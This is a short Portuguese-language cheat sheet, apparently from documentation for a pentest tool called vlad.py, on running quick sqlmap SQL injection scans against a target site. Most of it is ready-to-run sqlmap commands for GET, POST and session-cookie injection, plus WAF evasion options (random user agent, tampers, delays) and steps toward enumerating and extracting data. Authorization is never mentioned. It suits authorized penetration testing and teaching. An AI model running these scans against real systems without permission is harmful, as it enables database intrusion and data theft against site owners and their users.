# Scan Rápido de SQL Injection

## Quando Usar
- Reconhecimento inicial de um alvo
- Verificação rápida de vulnerabilidade
- Quando o tempo é limitado
- Antes de um scan mais profundo

## Comando Básico

```bash
sqlmap -u "http://alvo.com/produto?id=1" \
  --technique=EU \
  --level=1 --risk=1 \
  --threads=5 \
  --random-agent \
  --batch
```

## Com vlad.py

```bash
python vlad.py scan --alvo "http://alvo.com/produto?id=1" --modo rapido
```

## Parâmetros Explicados

| Flag | Valor | Descrição |
|------|-------|-----------|
| `--technique=EU` | E,U | Error-based + UNION (mais rápidas) |
| `--level=1` | 1 | Testa apenas parâmetros básicos |
| `--risk=1` | 1 | Payloads seguros, sem UPDATE/INSERT |
| `--threads=5` | 5 | 5 threads paralelos |
| `--random-agent` | - | User-Agent aleatório |
| `--batch` | - | Responde "yes" automaticamente |

## Exemplos de Cenários

### GET Simples
```bash
sqlmap -u "http://alvo.com/?id=1" --technique=EU --level=1 --batch
```

### POST
```bash
sqlmap -u "http://alvo.com/login" \
  --data="username=admin&password=test" \
  --technique=EU --level=1 --batch
```

### Com Cookie de Sessão
```bash
sqlmap -u "http://alvo.com/perfil?uid=5" \
  --cookie="PHPSESSID=abc123def456" \
  --technique=EU --level=1 --batch
```

### Especificar Parâmetro
```bash
sqlmap -u "http://alvo.com/?id=1&cat=2" \
  -p id \
  --technique=EU --level=1 --batch
```

## Interpretação Rápida dos Resultados

```
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
→ Injeção booleana detectada

[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
→ UNION injection detectada (melhor para extração)

[WARNING] GET parameter 'id' does not seem to be injectable
→ Sem injeção detectada (tentar --level=3 ou --technique=BT)
```

## Próximo Passo

- **Vulnerável detectado**: Prosseguir para enumeração
- **Não detectado**: Aumentar `--level=3` e `--technique=BEUST`
- **WAF bloqueando**: Adicionar tampers e `--delay=2`

```bash
# Scan padrão se rápido não encontrar nada
sqlmap -u "http://alvo.com/?id=1" --technique=BEUST --level=3 --batch
```
